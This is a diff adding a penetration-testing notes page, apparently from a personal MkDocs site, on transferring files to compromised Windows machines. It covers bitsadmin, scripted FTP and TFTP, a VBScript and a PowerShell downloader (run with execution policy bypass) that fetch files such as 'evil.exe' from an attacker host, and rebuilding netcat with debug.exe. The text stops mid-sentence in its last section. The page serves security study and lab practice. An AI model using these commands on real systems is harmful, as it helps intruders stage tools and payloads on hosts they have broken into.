@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Transferring Files Linux - Notes</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Transferring Files to Windows", url: "#_top", children: [
+              {title: "To and from client to server SMB / RDP", url: "#to-and-from-client-to-server-smb-rdp" },
+              {title: "From client to server SMB / RDP", url: "#from-client-to-server-smb-rdp" },
+              {title: "From X server to Windows (Bitsadmin)", url: "#from-x-server-to-windows-bitsadmin" },
+              {title: "FTP", url: "#ftp" },
+              {title: "TFTP", url: "#tftp" },
+              {title: "VBScript", url: "#vbscript" },
+              {title: "PowerShell", url: "#powershell" },
+              {title: "Debug.exe", url: "#debugexe" },
+          ]},
+          {title: "Transfering files Windows to linux", url: "#transfering-files-windows-to-linux", children: [
+              {title: "smb-client", url: "#smb-client" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../attacking_web_applications/oauth_attacks/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../attacking_web_applications/oauth_attacks/" class="btn btn-xs btn-link">
+        OAuth Attacks
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../post_exploitation/privilege_escalation_-_linux/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../post_exploitation/privilege_escalation_-_linux/" class="btn btn-xs btn-link">
+        Local Privilege Escalation - Linux
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="transferring-files-to-windows">Transferring Files to Windows<a class="headerlink" href="#transferring-files-to-windows" title="Permanent link">#</a></h1>
+<p>Transferring files to Linux is usually pretty easy. We can use <code>netcat</code>, <code>wget</code>, or <code>curl</code>, which most systems have as default. But windows does not have these tools.</p>
+<h2 id="to-and-from-client-to-server-smb-rdp">To and from client to server SMB / RDP<a class="headerlink" href="#to-and-from-client-to-server-smb-rdp" title="Permanent link">#</a></h2>
+<p>If you are using RDP on windows you can just attach a directory to share from when you start your RDP session.</p>
+<pre><code>xfreerdp /u:MYUSERNAME /v:10.10.10.1111 /drive:fildel,/home/temp/tmp
+</code></pre>
+
+<p>Now you can simply open the Computer part in your Explorer window, and you should see the disk <code>fildel</code>. In that share you can share documents between your computer and the RDP server.</p>
+<h2 id="from-client-to-server-smb-rdp">From client to server SMB / RDP<a class="headerlink" href="#from-client-to-server-smb-rdp" title="Permanent link">#</a></h2>
+<p>A simple way is simply to to connect to your server with xfreerdp and then open up the fil-browser in your linux machine, and copy the file. Then go to your windows server and simply paste the file.
+For me it only works in that direction, and not the reverse.</p>
+<h2 id="from-x-server-to-windows-bitsadmin">From X server to Windows (Bitsadmin)<a class="headerlink" href="#from-x-server-to-windows-bitsadmin" title="Permanent link">#</a></h2>
+<p>Downloading a file with CMD can be done with bitsadmin.</p>
+<pre><code>bitsadmin /transfer aaa http://192.168.66.87/apaa.txt c:\Users\temp\aaa.txt
+</code></pre>
+
+<h2 id="ftp">FTP<a class="headerlink" href="#ftp" title="Permanent link">#</a></h2>
+<p>Most windows machines have a ftp-client included. But we can't use it interactively since that most likely would kill our shell. So we have get around that. We can however run commands from a file. So what we want to do is to echo out the commands into a textfile. And then use that as our input to the ftp-client. Let me demonstrate.</p>
+<p>On the compromised machine we echo out the following commands into a file</p>
+<pre><code>echo open 192.168.1.101 21&gt; ftp.txt
+echo USER asshat&gt;&gt; ftp.txt
+echo mysecretpassword&gt;&gt; ftp.txt
+echo bin&gt;&gt; ftp.txt
+echo GET wget.exe&gt;&gt; ftp.txt
+echo bye&gt;&gt; ftp.txt
+</code></pre>
+
+<p>Then run this command to connect to the ftp</p>
+<pre><code>ftp -v -n -s:ftp.txt
+</code></pre>
+
+<p>Of course you need to have a ftp-server configured with the user asshat and the password to mysecretpassword.</p>
+<h2 id="tftp">TFTP<a class="headerlink" href="#tftp" title="Permanent link">#</a></h2>
+<p>Works by default on:  </p>
+<p><strong>Windows XP</strong>  </p>
+<p><strong>Windows 2003</strong></p>
+<p>A TFTP client is installed by default on windows machines up to Windows XP and Windows 2003. What is good about TFTP is that you can use it non-interactively. Which means less risk of losing your shell.</p>
+<p>Kali has a TFTP server build in.<br />
+You can server up some files with it like this</p>
+<pre><code>atftpd --daemon --port 69 /tftp
+/etc/init.d/atftpd restart
+</code></pre>
+
+<p>Now you can put stuff in <code>/srv/tftp</code> and it will be served. Remember that TFTP used UDP. So if you run <code>netstat</code> it will not show it as listening.</p>
+<p>You can see it running like this</p>
+<pre><code>netstat -a -p UDP | grep udp
+</code></pre>
+
+<p>So now you can upload and download whatever from the windows-machine like this</p>
+<pre><code>tftp -i 192.160.1.101 GET wget.exe
+</code></pre>
+
+<p>If you like to test that the tftp-server is working you can test it from Linux, I don't think it has a non-interactive way.</p>
+<pre><code>tftp 192.160.1.101
+GET test.txt
+</code></pre>
+
+<p>I usually put all files I want to make available in <code>/srv/tftp</code></p>
+<p>If you want to make sure that the file was uploaded correct you can check in the syslog. Grep for the IP like this:</p>
+<p><code>grep 192.168.1.101 /var/log/syslog</code></p>
+<h2 id="vbscript">VBScript<a class="headerlink" href="#vbscript" title="Permanent link">#</a></h2>
+<p>Here is a good script to make a wget-clone in VB.</p>
+<p>If it doesn't work try piping it through unix2dos before copying it.</p>
+<pre><code>echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
+echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
+echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs
+echo Err.Clear &gt;&gt; wget.vbs
+echo Set http = Nothing &gt;&gt; wget.vbs
+echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs
+echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs
+echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs
+echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs
+echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs
+echo http.Send &gt;&gt; wget.vbs
+echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs
+echo Set http = Nothing &gt;&gt; wget.vbs
+echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs
+echo strData = &quot;&quot; &gt;&gt; wget.vbs
+echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs
+echo Next &gt;&gt; wget.vbs
+echo ts.Close &gt;&gt; wget.vbs
+</code></pre>
+
+<p>You then execute the script like this:</p>
+<pre><code>cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
+</code></pre>
+
+<h2 id="powershell">PowerShell<a class="headerlink" href="#powershell" title="Permanent link">#</a></h2>
+<p>This is how we can download a file using PowerShell. Remember since we only have a non-interactive shell we cannot start PowerShell.exe, because our shell can't handle that. But we can get around that by creaing a PowerShell-script and then executing the script:</p>
+<pre><code>echo $storageDir = $pwd &gt; wget.ps1
+echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1
+echo $url = &quot;http://192.168.1.101/file.exe&quot; &gt;&gt;wget.ps1
+echo $file = &quot;output-file.exe&quot; &gt;&gt;wget.ps1
+echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1
+</code></pre>
+
+<p>Now we invoke it with this crazy syntax:</p>
+<pre><code class="powershell">powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+</code></pre>
+
+<h2 id="debugexe">Debug.exe<a class="headerlink" href="#debugexe" title="Permanent link">#</a></h2>
+<p>This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the <code>debug.exe</code> program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like <code>netcat</code>. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with <code>debug.exe</code>.</p>
+<p><code>Debug.exe</code> can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that:</p>
+<pre><code>upx -9 nc.exe
+</code></pre>
+
+<p>Now it only weights 29 kb. Perfect. So now let's disassemble it:</p>
+<pre><code>wine exe2bat.exe nc.exe nc.txt
+</code></pre>
+
+<p>Now we just copy-past the text into our windows-shell. And it will automatically create a file called nc.exe</p>
+<h1 id="transfering-files-windows-to-linux">Transfering files Windows to linux<a class="headerlink" href="#transfering-files-windows-to-linux" title="Permanent link">#</a></h1>
+<h2 id="smb-client">smb-client<a class="headerlink" href="#smb-client" title="Permanent link">#</a></h2>
+<p>If you only have a hash of a user which is </p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../attacking_web_applications/oauth_attacks/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../attacking_web_applications/oauth_attacks/" class="btn btn-xs btn-link">
+        OAuth Attacks
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../post_exploitation/privilege_escalation_-_linux/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../post_exploitation/privilege_escalation_-_linux/" class="btn btn-xs btn-link">
+        Local Privilege Escalation - Linux
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/transferring_files/transfering_files.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
